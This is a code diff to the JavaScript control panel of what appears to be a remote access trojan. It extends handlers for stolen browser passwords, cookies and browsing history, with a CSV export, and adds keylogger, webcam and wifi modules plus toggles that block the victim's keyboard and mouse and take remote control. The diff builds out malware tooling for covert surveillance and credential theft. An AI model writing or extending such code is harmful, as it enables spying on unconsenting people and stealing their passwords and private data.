@@ -26,7 +26,7 @@ import {
 } from '../modules/webcam.js';
 
 import { handleKeyEvent } from '../modules/keylogger.js';
-import { renderPasswordModal, handleCookiesResult } from '../modules/stealer.js';
+import { renderPasswordModal, handleCookiesResult, handleBrowserListResult, handleBrowserHistoryResult, closeHistoryModal, exportHistoryCSV } from '../modules/stealer.js';
 import { 
     renderDriveTree, 
     appendTreeChildren, 
@@ -38,9 +38,24 @@ import {
 } from '../modules/fileManager.js';
 
 import { handleIncomingChat, resetChat } from '../modules/chat.js';
-import { renderWifiData } from '../modules/wifi.js';
+import { renderWifiData, requestWifiScan } from '../modules/wifi.js';
 
 let ws = null;
+
+// Handle input block status response
+function handleInputBlockStatus(msg) {
+    const blockToggle = $('#toggle-block-input');
+    if (!blockToggle) return;
+    
+    if (msg.success) {
+        blockToggle.checked = msg.blocked;
+        console.log(msg.message);
+    } else {
+        // Revert toggle state on failure
+        blockToggle.checked = !blockToggle.checked;
+        alert('⚠️ ' + msg.message);
+    }
+}
 
 export function connectWs() {
     const wsUrlInput = $('#ws-url-input');
@@ -148,8 +163,16 @@ function onWsMessage(event) {
             break;
         case 'passwords_result':
             const browserName = msg.browser ? msg.browser.toUpperCase() : "BROWSER";
-            if (!msg.data || msg.data.length === 0) alert(`No passwords found for ${browserName}.`);
-            else renderPasswordModal(msg.data, browserName);
+            if (!msg.data || msg.data.length === 0) {
+                let alertMsg = `No passwords found for ${browserName}.`;
+                if (msg.warning) alertMsg += `\n\n⚠️ ${msg.warning}`;
+                alert(alertMsg);
+            } else {
+                renderPasswordModal(msg.data, browserName);
+                if (msg.warning) {
+                    setTimeout(() => alert(`⚠️ Warning: ${msg.warning}`), 500);
+                }
+            }
             break;
         case 'cookies_result':
             handleCookiesResult(msg);
@@ -207,8 +230,18 @@ function onWsMessage(event) {
             break;
         case 'chat_message':
             handleIncomingChat(msg.text);
+            break;
         case 'wifi_info':
             renderWifiData(msg);
+            break;
+        case 'input_block_status':
+            handleInputBlockStatus(msg);
+            break;
+        case 'browser_list':
+            handleBrowserListResult(msg);
+            break;
+        case 'browser_history_result':
+            handleBrowserHistoryResult(msg);
             break;
     }
 }
@@ -231,6 +264,18 @@ function resetUI() {
     if (keylogOutput) keylogOutput.textContent = 'Waiting...';
     const keylogToggle = $('#keylog-toggle');
     if (keylogToggle) keylogToggle.checked = false;
+    
+    // Reset Block Input toggle
+    const blockInputToggle = $('#toggle-block-input');
+    if (blockInputToggle) {
+        blockInputToggle.checked = false;
+        blockInputToggle.disabled = true;
+    }
+    
+    // Reset Control toggle
+    const controlToggle = $('#toggle-control');
+    if (controlToggle) controlToggle.checked = false;
+    
     resetAppState();
     clearWebcamStreamUI();
     resetChat();
